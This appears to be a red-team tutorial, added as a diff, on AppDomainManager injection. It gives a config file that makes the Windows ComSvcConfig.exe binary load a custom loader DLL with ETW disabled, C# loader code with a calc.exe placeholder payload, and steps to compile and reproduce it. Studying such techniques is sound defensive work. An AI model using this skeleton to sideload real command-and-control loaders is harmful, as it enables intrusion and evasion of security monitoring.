@@ -1,0 +1,49 @@
+Think of AppDomainManager as a class which will be present in the shellcode loader that can be invoked from a .Net configuration file. This .Net configuration file (ComSvcConfig.exe.config) contains reference to the AppDomain Manager Libraries (ClickOnceLoader.dll). Once ComSvcConfig.exe gets executed, it loads up configuration file (ComSvcConfig.exe.config). The content of this ComSvcConfig.exe.config file looks similar to the one shown below:
+
+// Some code
+<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
+<probing privatePath="."/>
+<etwEnable enabled="false" />
+<appDomainManagerAssembly value="ClickOnceLoader, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null" />
+<appDomainManagerType value="MyAppDomainManager" />
+Looking at the configuration file(ComSvcConfig.exe.config), we can see a similar entry to
+
+<appDomainManagerAssembly value=ClickOnceLoader .......>
+
+ClickOnceLoader is the command and control loader DLL which will get sideloaded using AppDomainManager injection. Let's examine what a sample loader code supporting AppDomainManager might look like:
+
+// Loader.cs
+using System;
+using System.Diagnostics;
+using System.Reflection;
+
+public sealed class MyAppDomainManager : AppDomainManager {
+public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
+ExecuteLoader();
+return;
+}
+
+    private void ExecuteLoader() {
+        Assembly currentAssembly = Assembly.GetExecutingAssembly();
+        MethodInfo entryPoint = currentAssembly.EntryPoint;
+        object entryPointInstance = Activator.CreateInstance(Type.GetType("EntryPointClass"));
+        MethodInfo LoaderMethod = entryPointInstance.GetType().GetMethod("LoaderMethod");
+        LoaderMethod.Invoke(entryPointInstance, null);
+    }
+
+}
+
+public class EntryPointClass {
+    public void LoaderMethod() {
+        Process.Start("calc.exe");
+        //loader code here
+        }
+}
+Here are the steps to reproduce your first AppDomainManager Injection:
+
+Create a folder named AppDomain and copy ComSvcConfig.exe from C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ to the AppDomain folder.
+Create a ComSvcConfig.exe.config file as shown above.
+Compile the sample loader code given above(Loader.cs) using the following command line:
+%WINDIR%\Microsoft.NET\Framework64\v2.0.50727\csc.exe /platform:anycpu /o+
+/r:System.EnterpriseServices.dll /r:System.Management.Automation.dll
+/r:Microsoft.Build.Framework.dll /target:library /out:"AppDomain\ClickOnceLoader.dll" "Loader.cs"
